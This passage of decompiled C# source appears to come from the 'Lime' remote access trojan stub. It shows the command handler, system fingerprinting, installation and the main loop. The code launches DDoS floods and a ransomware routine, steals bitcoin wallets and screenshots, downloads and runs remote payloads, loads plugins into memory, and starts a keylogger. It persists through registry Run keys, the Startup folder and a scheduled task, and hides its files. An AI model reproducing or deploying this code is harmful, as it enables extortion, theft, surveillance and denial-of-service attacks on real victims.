            if (Operators.CompareString(str1, "ReverseMouse", false) == 0)
            {
              Core.SwapMouseButton(256L);
              break;
            }
            break;
          case 3108627940:
            if (Operators.CompareString(str1, "MonitorON", false) == 0)
            {
              Core.SendMessage(-1, 274U, 61808U, -1);
              break;
            }
            break;
          case 3213366942:
            if (Operators.CompareString(str1, "EnableCMD", false) == 0)
            {
              try
              {
                MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", (object) "0", RegistryValueKind.DWord);
                Core.Send("MSG" + Core.Y + "CMD: Enabled");
                break;
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                Core.Send("MSG" + Core.Y + "CMD: Lime's Stub is not running as administrator");
                ProjectData.ClearProjectError();
                break;
              }
            }
            else
              break;
          case 3258650847:
            if (Operators.CompareString(str1, "ddos.slowloris.stop", false) == 0)
            {
              Slowloris.StopSlowloris();
              break;
            }
            break;
          case 3391417444:
            if (Operators.CompareString(str1, "ddos.ARME.stop", false) == 0)
            {
              ARME.StopARME();
              break;
            }
            break;
          case 3553460540:
            if (Operators.CompareString(str1, "SetClp", false) == 0)
            {
              ParameterizedThreadStart start;
              // ISSUE: reference to a compiler-generated field
              if (Core._Closure\u0024__.\u0024IR32\u002D1 != null)
              {
                // ISSUE: reference to a compiler-generated field
                start = Core._Closure\u0024__.\u0024IR32\u002D1;
              }
              else
              {
                // ISSUE: reference to a compiler-generated field
                Core._Closure\u0024__.\u0024IR32\u002D1 = start = (ParameterizedThreadStart) (a0 => Clipboard.SetText(Conversions.ToString(a0)));
              }
              Thread thread = new Thread(start);
              thread.SetApartmentState(ApartmentState.STA);
              thread.Start((object) strArray1[1]);
              Core.Send("MSG" + Core.Y + "Clipboard copied successfully!");
              break;
            }
            break;
          case 3587384608:
            if (Operators.CompareString(str1, "ddos.ARME.start", false) == 0)
            {
              ARME.StartARME(strArray1[1], 10, 21600, "");
              break;
            }
            break;
          case 3642407086:
            if (Operators.CompareString(str1, "OpenWebpage", false) == 0)
            {
              Process.Start(strArray1[1]);
              break;
            }
            break;
          case 3804159632:
            if (Operators.CompareString(str1, "Rware", false) == 0)
            {
              if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\MMC\\hash"))
              {
                Core.Send("MSG" + Core.Y + "Ransomware: The client is already encrypted");
                return;
              }
              new Rware().GenKey();
              break;
            }
            break;
          case 3883927432:
            if (Operators.CompareString(str1, "BitcoinON", false) == 0)
            {
              if (!Core.BTC_EN)
              {
                Core.Send("MSG" + Core.Y + "BitcoinGrabber was not checked when stub created!");
                return;
              }
              bitgrb.Start();
              Interaction.SaveSetting("Lime", "SU", "btc", "1");
              Core.Send("MSG" + Core.Y + "BitcoinGrabber started successfully!");
              break;
            }
            break;
          case 3917606159:
            if (Operators.CompareString(str1, "botk", false) == 0)
            {
              BotKillers.RunStandardBotKiller();
              Core.Send("MSG" + Core.Y + "Malware Killer ran successfully!");
              break;
            }
            break;
          case 3968740937:
            if (Operators.CompareString(str1, "ShowBar", false) == 0)
            {
              try
              {
                string lpClassName = "Shell_traywnd";
                string lpWindowName = "";
                Core.SetWindowPos(Core.FindWindow(ref lpClassName, ref lpWindowName), 0, 0, 0, 0, 0, 64);
                Core.Send("MSG" + Core.Y + "Showbar");
                break;
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
                break;
              }
            }
            else
              break;
          case 4013831322:
            if (Operators.CompareString(str1, "prof", false) == 0)
            {
              string Left = strArray1[1];
              if (Operators.CompareString(Left, "~", false) != 0)
              {
                if (Operators.CompareString(Left, "!", false) != 0)
                {
                  if (Operators.CompareString(Left, "@", false) != 0)
                    return;
                  Core.DLV(strArray1[2]);
                  return;
                }
                Core.STV(strArray1[2], (object) strArray1[3], RegistryValueKind.String);
                Core.Send(Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject((object) ("getvalue" + Core.Y + strArray1[1] + Core.Y), RuntimeHelpers.GetObjectValue(Core.GTV(strArray1[1], (object) ""))))));
                return;
              }
              Core.STV(strArray1[2], (object) strArray1[3], RegistryValueKind.String);
              return;
            }
            break;
          case 4059481196:
            if (Operators.CompareString(str1, "pcspecs", false) == 0)
            {
              Core.Send("MSG" + Core.Y + "CPU: " + Core.GetCPU() + " || GPU: " + Core.GetVideoCard() + " || RAM: " + Strings.Format((object) ((double) MyProject.Computer.Info.TotalPhysicalMemory / 1024.0 / 1024.0 / 1024.0), "###,###,##0 GB"));
              break;
            }
            break;
          case 4076034920:
            if (Operators.CompareString(str1, "searchwallet", false) == 0)
            {
              Core.Send("MSG" + Core.Y + "Installed Wallet: " + Core.GetWallet() ?? "");
              break;
            }
            break;
          case 4171019001:
            if (Operators.CompareString(str1, "antiproc", false) == 0)
            {
              MyAntiProcess.Start();
              Interaction.SaveSetting("Lime", "SU", "anti", "1");
              Core.Send("MSG" + Core.Y + "Anti Process started!");
              break;
            }
            break;
          case 4269631087:
            if (Operators.CompareString(str1, "BlockWebpage", false) == 0)
            {
              try
              {
                MyProject.Computer.FileSystem.WriteAllText("C:\\WINDOWS\\system32\\drivers\\etc\\hosts", "\r\n127.0.0.1  " + strArray1[1], true);
                Core.Send("MSG" + Core.Y + "Webpage " + strArray1[1] + " Blocked successfully!");
                break;
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                Core.Send("MSG" + Core.Y + "Block Webpage: Lime's Stub is not running as administrator");
                ProjectData.ClearProjectError();
                break;
              }
            }
            else
              break;
        }
        if (Operators.CompareString(str1, "rn", false) == 0)
        {
          byte[] bytes;
          if (strArray1[2][0] == '\u001F')
          {
            try
            {
              MemoryStream memoryStream = new MemoryStream();
              int length = (strArray1[0] + Core.Y + strArray1[1] + Core.Y).Length;
              memoryStream.Write(b, length, checked (b.Length - length));
              bytes = Core.ZIP(memoryStream.ToArray());
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.SetProjectError(ex);
              Core.Send("MSG" + Core.Y + "Execute ERROR");
              Core.Send("bla");
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
              return;
            }
          }
          else
          {
            WebClient webClient = new WebClient();
            try
            {
              bytes = webClient.DownloadData(strArray1[2]);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.SetProjectError(ex);
              Core.Send("MSG" + Core.Y + "Download ERROR");
              Core.Send("bla");
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
              return;
            }
          }
          Core.Send("bla");
          string str4 = Path.GetTempFileName() + "." + strArray1[1];
          try
          {
            System.IO.File.WriteAllBytes(str4, bytes);
            Process.Start(str4);
            Core.Send("MSG" + Core.Y + "Executed As " + new FileInfo(str4).Name);
          }
          catch (Exception ex1)
          {
            ProjectData.SetProjectError(ex1);
            Exception ex2 = ex1;
            ProjectData.SetProjectError(ex2);
            Exception exception = ex2;
            Core.Send("MSG" + Core.Y + "Execute ERROR " + exception.Message);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(str1, "inv", false) != 0)
        {
          if (Operators.CompareString(str1, "ret", false) != 0)
          {
            if (Operators.CompareString(str1, "CAP", false) != 0)
            {
              if (Operators.CompareString(str1, "un", false) == 0)
              {
                string Left = strArray1[1];
                if (Operators.CompareString(Left, "~", false) != 0)
                {
                  if (Operators.CompareString(Left, "!", false) != 0)
                  {
                    if (Operators.CompareString(Left, "@", false) != 0)
                      return;
                    Core.pr(0);
                    Process.Start(Core.LO.FullName);
                    ProjectData.EndApp();
                  }
                  else
                  {
                    Core.pr(0);
                    ProjectData.EndApp();
                  }
                }
                else
                  Core.UNS();
              }
              else if (Operators.CompareString(str1, "up", false) == 0)
              {
                byte[] bytes;
                if (strArray1[1][0] == '\u001F')
                {
                  try
                  {
                    MemoryStream memoryStream = new MemoryStream();
                    int length = (strArray1[0] + Core.Y).Length;
                    memoryStream.Write(b, length, checked (b.Length - length));
                    bytes = Core.ZIP(memoryStream.ToArray());
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    ProjectData.SetProjectError(ex);
                    Core.Send("MSG" + Core.Y + "Update ERROR");
                    Core.Send("bla");
                    ProjectData.ClearProjectError();
                    ProjectData.ClearProjectError();
                    return;
                  }
                }
                else
                {
                  WebClient webClient = new WebClient();
                  try
                  {
                    bytes = webClient.DownloadData(strArray1[1]);
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    ProjectData.SetProjectError(ex);
                    Core.Send("MSG" + Core.Y + "Update ERROR");
                    Core.Send("bla");
                    ProjectData.ClearProjectError();
                    ProjectData.ClearProjectError();
                    return;
                  }
                }
                Core.Send("bla");
                string str5 = Path.GetTempFileName() + ".exe";
                try
                {
                  Core.Send("MSG" + Core.Y + "Updating To " + new FileInfo(str5).Name);
                  Thread.Sleep(2000);
                  System.IO.File.WriteAllBytes(str5, bytes);
                  Process.Start(str5, "..");
                }
                catch (Exception ex3)
                {
                  ProjectData.SetProjectError(ex3);
                  Exception ex4 = ex3;
                  ProjectData.SetProjectError(ex4);
                  Exception exception = ex4;
                  Core.Send("MSG" + Core.Y + "Update ERROR " + exception.Message);
                  ProjectData.ClearProjectError();
                  ProjectData.ClearProjectError();
                  return;
                }
                Core.UNS();
              }
              else if (Operators.CompareString(str1, "Ex", false) == 0)
              {
                if (Core.PLG == null)
                {
                  Core.Send("PLG");
                  int num = 0;
                  while (!(Core.PLG != null | num == 20 | !Core.Cn))
                  {
                    checked { ++num; }
                    Thread.Sleep(1000);
                  }
                  if (Core.PLG == null | !Core.Cn)
                    return;
                }
                object[] Arguments = new object[1]
                {
                  (object) b
                };
                bool[] CopyBack = new bool[1]{ true };
                NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(Core.PLG), (System.Type) null, "ind", Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
                if (CopyBack[0])
                  b = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Arguments[0])), typeof (byte[]));
              }
              else if (Operators.CompareString(str1, "PLG", false) == 0)
              {
                MemoryStream memoryStream = new MemoryStream();
                int length = (strArray1[0] + Core.Y).Length;
                memoryStream.Write(b, length, checked (b.Length - length));
                Core.PLG = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Core.Plugin(Core.ZIP(memoryStream.ToArray()), "A")));
                NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(Core.PLG), (System.Type) null, "H", new object[1]
                {
                  (object) Core.H
                }, (string[]) null, (System.Type[]) null);
                NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(Core.PLG), (System.Type) null, "P", new object[1]
                {
                  (object) Core.P
                }, (string[]) null, (System.Type[]) null);
                NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(Core.PLG), (System.Type) null, "c", new object[1]
                {
                  (object) Core.C
                }, (string[]) null, (System.Type[]) null);
              }
            }
            else
            {
              Bitmap bitmap1 = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format16bppRgb555);
              Graphics g = Graphics.FromImage((Image) bitmap1);
              Size blockRegionSize = new Size(bitmap1.Width, bitmap1.Height);
              g.CopyFromScreen(0, 0, 0, 0, blockRegionSize, CopyPixelOperation.SourceCopy);
              try
              {
                Rectangle targetRect = new Rectangle(Cursor.Position, new Size(32, 32));
                Cursors.Default.Draw(g, targetRect);
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
                ProjectData.ClearProjectError();
              }
              g.Dispose();
              Bitmap bitmap2 = new Bitmap(Conversions.ToInteger(strArray1[1]), Conversions.ToInteger(strArray1[2]));
              Graphics graphics = Graphics.FromImage((Image) bitmap2);
              graphics.DrawImage((Image) bitmap1, 0, 0, bitmap2.Width, bitmap2.Height);
              graphics.Dispose();
              MemoryStream memoryStream1 = new MemoryStream();
              string S = "CAP" + Core.Y;
              b = Core.SB(ref S);
              memoryStream1.Write(b, 0, b.Length);
              MemoryStream memoryStream2 = new MemoryStream();
              bitmap2.Save((Stream) memoryStream2, ImageFormat.Jpeg);
              string Left = Core.md5(memoryStream2.ToArray());
              if (Operators.CompareString(Left, Core.lastcap, false) != 0)
              {
                Core.lastcap = Left;
                memoryStream1.Write(memoryStream2.ToArray(), 0, checked ((int) memoryStream2.Length));
              }
              else
                memoryStream1.WriteByte((byte) 0);
              Core.Sendb(memoryStream1.ToArray());
              memoryStream1.Dispose();
              memoryStream2.Dispose();
              bitmap1.Dispose();
              bitmap2.Dispose();
            }
          }
          else
          {
            byte[] numArray = (byte[]) Core.GTV(strArray1[1], (object) new byte[0]);
            if (strArray1[2].Length < 10 & numArray.Length == 0)
            {
              Core.Send("pl" + Core.Y + strArray1[1] + Core.Y + Conversions.ToString(1));
            }
            else
            {
              if (strArray1[2].Length > 10)
              {
                MemoryStream memoryStream = new MemoryStream();
                int length = (strArray1[0] + Core.Y + strArray1[1] + Core.Y).Length;
                memoryStream.Write(b, length, checked (b.Length - length));
                numArray = Core.ZIP(memoryStream.ToArray());
                Core.STV(strArray1[1], (object) numArray, RegistryValueKind.Binary);
              }
              Core.Send("pl" + Core.Y + strArray1[1] + Core.Y + Conversions.ToString(0));
              object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Core.Plugin(numArray, "A")));
              string[] strArray4 = new string[5]
              {
                "ret",
                Core.Y,
                strArray1[1],
                Core.Y,
                null
              };
              string s = Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "GT", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)));
              strArray4[4] = Core.ENB(ref s);
              Core.Send(string.Concat(strArray4));
            }
          }
        }
        else
        {
          byte[] numArray = (byte[]) Core.GTV(strArray1[1], (object) new byte[0]);
          if (strArray1[3].Length < 10 & numArray.Length == 0)
          {
            Core.Send("pl" + Core.Y + strArray1[1] + Core.Y + Conversions.ToString(1));
          }
          else
          {
            if (strArray1[3].Length > 10)
            {
              MemoryStream memoryStream = new MemoryStream();
              int length = (strArray1[0] + Core.Y + strArray1[1] + Core.Y + strArray1[2] + Core.Y).Length;
              memoryStream.Write(b, length, checked (b.Length - length));
              numArray = Core.ZIP(memoryStream.ToArray());
              Core.STV(strArray1[1], (object) numArray, RegistryValueKind.Binary);
            }
            Core.Send("pl" + Core.Y + strArray1[1] + Core.Y + Conversions.ToString(0));
            object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Core.Plugin(numArray, "A")));
            NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "h", new object[1]
            {
              (object) Core.H
            }, (string[]) null, (System.Type[]) null);
            NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "p", new object[1]
            {
              (object) Core.P
            }, (string[]) null, (System.Type[]) null);
            NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "osk", new object[1]
            {
              (object) strArray1[2]
            }, (string[]) null, (System.Type[]) null);
            NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "start", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
            while (!Conversions.ToBoolean(RuntimeHelpers.GetObjectValue(Operators.OrObject((object) !Core.Cn, RuntimeHelpers.GetObjectValue(Operators.CompareObjectEqual(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "Off", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)), (object) true, false))))))
              Thread.Sleep(1);
            NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "off", new object[1]
            {
              (object) true
            }, (string[]) null, (System.Type[]) null);
          }
        }
      }
      catch (Exception ex5)
      {
        ProjectData.SetProjectError(ex5);
        Exception ex6 = ex5;
        ProjectData.SetProjectError(ex6);
        Exception exception = ex6;
        if (strArray1.Length > 0 && Operators.CompareString(strArray1[0], "Ex", false) == 0 | Operators.CompareString(strArray1[0], "PLG", false) == 0)
          Core.PLG = (object) null;
        try
        {
          Core.Send("ER" + Core.Y + strArray1[0] + Core.Y + exception.Message);
        }
        catch (Exception ex7)
        {
          ProjectData.SetProjectError(ex7);
          ProjectData.SetProjectError(ex7);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }

    public static string inf()
    {
      string str1 = "ll" + Core.Y;
      string str2;
      try
      {
        if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(Core.GTV("vn", (object) "")), (object) "", false))
        {
          string str3 = str1;
          string s = Core.DEB(ref Core.VN) + "_" + Core.HWD();
          string str4 = Core.ENB(ref s);
          string y = Core.Y;
          str2 = str3 + str4 + y;
        }
        else
        {
          string str5 = str1;
          string s1 = Conversions.ToString(RuntimeHelpers.GetObjectValue(Core.GTV("vn", (object) "")));
          string s2 = Core.DEB(ref s1) + "_" + Core.HWD();
          string str6 = Core.ENB(ref s2);
          string y = Core.Y;
          str2 = str5 + str6 + y;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        string str7 = str1;
        string s = Core.HWD();
        string str8 = Core.ENB(ref s);
        string y = Core.Y;
        str2 = str7 + str8 + y;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str9;
      try
      {
        str9 = str2 + Environment.MachineName + Core.Y;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str9 = str2 + "??" + Core.Y;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str10;
      try
      {
        str10 = str9 + Environment.UserName + Core.Y;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str10 = str9 + "??" + Core.Y;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str11;
      try
      {
        string str12 = str10;
        DateTime dateTime = Core.LO.LastWriteTime;
        dateTime = dateTime.Date;
        string str13 = dateTime.ToString("yy-MM-dd");
        string y = Core.Y;
        str11 = str12 + str13 + y;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str11 = str10 + "??-??-??" + Core.Y;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str14 = str11 + Core.Y;
      string str15;
      try
      {
        str15 = str14 + Core.F.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str15 = str14 + "??";
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str16 = str15 + "SP";
      string str17;
      try
      {
        string[] strArray = Strings.Split(Environment.OSVersion.ServicePack);
        if (strArray.Length == 1)
          str16 += "0";
        str17 = str16 + strArray[checked (strArray.Length - 1)];
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str17 = str16 + "0";
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str18;
      try
      {
        str18 = !Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86") ? str17 + " x86" + Core.Y : str17 + " x64" + Core.Y;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str18 = str17 + Core.Y;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str19 = (!Core.Cam() ? str18 + "No" + Core.Y : str18 + "Yes" + Core.Y) + Core.GETav() + Core.Y + ".." + Core.Y + Core.ACT() + Core.Y;
      string str20 = "";
      try
      {
        string[] valueNames = Core.F.Registry.CurrentUser.CreateSubKey("Software\\" + Core.RG, RegistryKeyPermissionCheck.Default).GetValueNames();
        int index = 0;
        while (index < valueNames.Length)
        {
          string str21 = valueNames[index];
          if (str21.Length == 32)
            str20 = str20 + str21 + ",";
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return str19 + str20;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void INS()
    {
      Thread.Sleep(1000);
      if (Core.Idr && !Core.CompDir(Core.LO, new FileInfo(Interaction.Environ(Core.DR).ToLower() + "\\" + Core.EXE.ToLower())))
      {
        try
        {
          if (System.IO.File.Exists(Interaction.Environ(Core.DR) + "\\" + Core.EXE))
            System.IO.File.Delete(Interaction.Environ(Core.DR) + "\\" + Core.EXE);
          FileStream fileStream = new FileStream(Interaction.Environ(Core.DR) + "\\" + Core.EXE, FileMode.CreateNew);
          byte[] array = System.IO.File.ReadAllBytes(Core.LO.FullName);
          fileStream.Write(array, 0, array.Length);
          fileStream.Flush();
          fileStream.Close();
          Core.LO = new FileInfo(Interaction.Environ(Core.DR) + "\\" + Core.EXE);
          Process.Start(Core.LO.FullName);
          ProjectData.EndApp();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.EndApp();
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Conversions.ToBoolean((object) Core.HIDE_ME))
        System.IO.File.SetAttributes(Interaction.Environ(Core.DR) + "\\" + Core.EXE, FileAttributes.Hidden);
      try
      {
        Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      if (Core.Isu)
      {
        try
        {
          Core.F.Registry.CurrentUser.OpenSubKey(Core.sf, true).SetValue(Core.RG, (object) ("\"" + Core.LO.FullName + "\" .."));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
        try
        {
          Core.F.Registry.LocalMachine.OpenSubKey(Core.sf, true).SetValue(Core.RG, (object) ("\"" + Core.LO.FullName + "\" .."));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Core.IsF)
      {
        try
        {
          System.IO.File.Copy(Core.LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Core.RG, true);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Conversions.ToBoolean((object) Core.HIDE_ME))
        System.IO.File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
      try
      {
        MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object) 0);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void eroc()
    {
      Thread.Sleep(checked ((int) Math.Round(Math.Round(Math.Round(unchecked (Conversions.ToDouble(Core.SLP) * 1000.0))))));
      try
      {
        string setting = Interaction.GetSetting("Lime", "SU", "anti");
        if (setting.EndsWith("1"))
          MyAntiProcess.Start();
        else if (setting.EndsWith("0"))
          Core.Anti_CH = false;
        else if (Core.Anti_CH)
          MyAntiProcess.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        if (Interaction.GetSetting("Lime", "SU", "btc").EndsWith("1"))
          bitgrb.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      if (Core.BOT_KILL)
      {
        try
        {
          BotKillers.RunStandardBotKiller();
          Thread.Sleep(50);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Core.USB_SP)
        SPUSB.Enable();
      if (Core.Persis)
      {
        try
        {
          object executablePath = (object) Application.ExecutablePath;
          Interaction.Shell("schtasks /Delete /tn NYAN /F", AppWinStyle.Hide);
          Thread.Sleep(100);
          Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) "schtasks /create /tn NYAN /tr \"", executablePath), (object) "\" /sc minute /mo 1")), AppWinStyle.Hide);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Interaction.Command() != null)
      {
        try
        {
          Core.F.Registry.CurrentUser.SetValue("di", (object) "!");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
        Thread.Sleep(5000);
      }
      bool createdNew = false;
      Core.MT = (object) new Mutex(true, Core.RG, out createdNew);
      if (!createdNew)
        ProjectData.EndApp();
      Core.INS();
      if (!Core.Idr)
      {
        Core.EXE = Core.LO.Name;
        Core.DR = Core.LO.Directory.Name;
      }
      new Thread(new ThreadStart(Core.RC), 1).Start();
      try
      {
        Core.kq = new kl();
        new Thread(new ThreadStart(Core.kq.WRK), 1).Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      int num1 = 0;
      string Left = "";
      if (Core.BD)
      {
        try
        {
          SystemEvents.SessionEnding += (SessionEndingEventHandler) ((a0, a1) => Core.ED());
          Core.pr(1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      try
      {
        if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\STSL.dat"))
        {
          int num2 = (int) new LimeSL().ShowDialog();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      while (true)
      {
        Thread.Sleep(1000);
        if (!Core.Cn)
          Left = "";
        Application.DoEvents();
        try
        {
          checked { ++num1; }
          if (num1 == 5)
          {
            try
            {
              Process.GetCurrentProcess().MinWorkingSet = (IntPtr) 1024;
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
            }
          }
          if (num1 >= 8)
          {
            num1 = 0;
            string Right = Core.ACT();
            if (Operators.CompareString(Left, Right, false) != 0)
            {
              Left = Right;
              Core.Send("act" + Core.Y + Right);
            }
          }
          if (Core.Isu)
          {
            try
            {
              if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(Core.F.Registry.CurrentUser.GetValue(Core.sf + "\\" + Core.RG, (object) "")), (object) ("\"" + Core.LO.FullName + "\" .."), false))
                Core.F.Registry.CurrentUser.OpenSubKey(Core.sf, true).SetValue(Core.RG, (object) ("\"" + Core.LO.FullName + "\" .."));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
            }
            try
            {
              if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(Core.F.Registry.LocalMachine.GetValue(Core.sf + "\\" + Core.RG, (object) "")), (object) ("\"" + Core.LO.FullName + "\" .."), false))
                Core.F.Registry.LocalMachine.OpenSubKey(Core.sf, true).SetValue(Core.RG, (object) ("\"" + Core.LO.FullName + "\" .."));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
    }

    public static string md5(byte[] B)
    {
      B = new MD5CryptoServiceProvider().ComputeHash(B);
      string str = "";
      byte[] numArray = B;
      int index = 0;
      while (index < numArray.Length)
      {
        byte num = numArray[index];
        str += num.ToString("x2");
        checked { ++index; }
      }
      return str;
    }

    [DllImport("ntdll")]
    private static extern int NtSetInformationProcess(
      IntPtr hProcess,
      int processInformationClass,
      ref int processInformation,
      int processInformationLength);

    public static object Plugin(byte[] b, string c)
    {
      Module[] modules = Assembly.Load(b).GetModules();
      int index1 = 0;
      while (index1 < modules.Length)
      {
        Module module = modules[index1];
        System.Type[] types = module.GetTypes();
        int index2 = 0;
        while (index2 < types.Length)
        {
          System.Type type = types[index2];
          if (type.FullName.EndsWith("." + c))
            return module.Assembly.CreateInstance(type.FullName);
          checked { ++index2; }
        }
        checked { ++index1; }
      }
      return (object) null;
    }

    public static void pr(int i)
    {
      try
      {
